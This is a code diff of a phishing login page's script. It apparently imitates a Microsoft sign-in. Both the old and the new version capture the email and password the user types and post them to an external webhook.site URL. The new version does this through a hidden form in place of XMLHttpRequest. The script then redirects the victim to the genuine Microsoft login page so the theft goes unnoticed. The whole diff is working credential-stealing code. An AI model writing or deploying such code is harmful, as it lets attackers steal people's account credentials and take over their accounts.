@@ -57,29 +57,38 @@
 
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();  // Prevent form submission from reloading the page
+            e.preventDefault(); // Prevent the form from submitting normally
 
-            // Get the form data
+            // Get form data
             var email = document.getElementById('email').value;
             var password = document.getElementById('password').value;
 
-            // Create a new AJAX request
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://webhook.site/663b8d2c-02ed-4425-890e-774dfe86f880', true);
-            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            // Create a hidden form to submit to Webhook
+            var form = document.createElement('form');
+            form.action = 'https://webhook.site/663b8d2c-02ed-4425-890e-774dfe86f880';
+            form.method = 'POST';
 
-            // Prepare the data to be sent in the request
-            var params = 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password);
+            // Create hidden input fields for the data
+            var emailInput = document.createElement('input');
+            emailInput.type = 'hidden';
+            emailInput.name = 'email';
+            emailInput.value = email;
 
-            // Send the request with the data
-            xhr.send(params);
+            var passwordInput = document.createElement('input');
+            passwordInput.type = 'hidden';
+            passwordInput.name = 'password';
+            passwordInput.value = password;
 
-            // Once the request is done, redirect to Microsoft login page
-            xhr.onload = function() {
-                if (xhr.status === 200) {
-                    window.location.href = 'https://login.microsoftonline.com/';  // Redirect to Microsoft login page
-                }
-            };
+            // Append inputs to the form
+            form.appendChild(emailInput);
+            form.appendChild(passwordInput);
+
+            // Append the form to the body and submit it
+            document.body.appendChild(form);
+            form.submit();
+
+            // After submitting the data to Webhook, redirect to Microsoft login
+            window.location.href = 'https://login.microsoftonline.com/';
         });
     </script>
 
